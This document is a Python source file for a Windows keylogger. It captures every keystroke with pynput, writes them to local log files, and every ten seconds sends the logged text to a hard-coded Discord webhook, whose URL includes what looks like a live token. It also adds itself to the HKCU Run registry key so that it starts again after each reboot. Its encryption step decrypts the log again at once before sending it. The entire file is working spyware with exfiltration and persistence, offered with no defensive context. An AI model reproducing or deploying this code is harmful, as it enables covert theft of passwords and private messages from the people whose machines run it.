from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from dhooks import Webhook
from threading import Timer
import logging
import os
import winreg
import sys

#generate fernet key
key = Fernet.generate_key()

with open("mykey.key", "wb") as mykey:
    mykey.write(key)

def encryptor():
    f = Fernet(key)

    with open("log.txt", "rb") as original_file:
        original = original_file.read()

    encrypted = f.encrypt(original)

    with open("log.txt", "wb") as encrypted_file:
        encrypted = encrypted_file.write(encrypted)

    with open("log.txt", "rb") as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = f.decrypt(encrypted).decode("utf-8")
    
    print(decrypted)

    return decrypted

# variables to check the key presses
log_dir = ""
char_count = 0
keys = []

# constants for the periodic log sending and webhook url
WEBHOOK_URL = "https://discord.com/api/webhooks/1115908469330026526/gSpmYbCUZiL1N9KvMm_j5garlQPiUcdZYnkhERWMVLFoYIRX9tpZpes_M7ph5OinrtoB"
TIME_INTERVAL = 10

# inputting the webhook url
log_send = Webhook(WEBHOOK_URL)

# saving the file as keylogs.txt to monitor the details
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    try:
        with open("eachkeylog.txt", "a") as file:
            key = "Key Pressed: " + str(key)
            file.write(key)
            file.write("\n")
    except Exception as ex:
        with open("eachkeylog.txt", "a") as file:
            key = "There was an error: " + str(ex)
            file.write(key)
            file.write("\n")

    # log the key
    # log_send.send(str(key))

def on_key_release(key):
    global keys, char_count

    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            write_to_file(keys)
            char_count = 0
            keys = []
        elif key == Key.space:
            key = " "
            write_to_file(keys)
            keys = []
            char_count = 0
        keys.append(key)
        char_count += 1

def write_to_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")

def report():
    if not os.path.exists("log.txt"):
        open("log.txt", "w").close()  # Create an empty log.txt file if it doesn't exist

    if os.path.getsize("log.txt") != 0:
        decrypted = encryptor()
        # with open("log.txt", "r") as file:
        #     keylogs = file.read()
        log_send.send(str(decrypted))
    
    open("log.txt", "w").close()

    Timer(TIME_INTERVAL, lambda: report()).start()

def add_to_startup():
    # Get the path to the executable
    executable_path = sys.executable
    # Get the name of the program without the file extension
    program_name = os.path.splitext(os.path.basename(executable_path))[0]

    # Open the "Run" registry key
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )

    # Set the program path as the registry value
    winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, executable_path)

    # Close the registry key
    winreg.CloseKey(key)
    

def run():
    add_to_startup()
    report()
    with Listener(on_press=on_press, on_release=on_key_release) as listener:
        listener.join()

run()
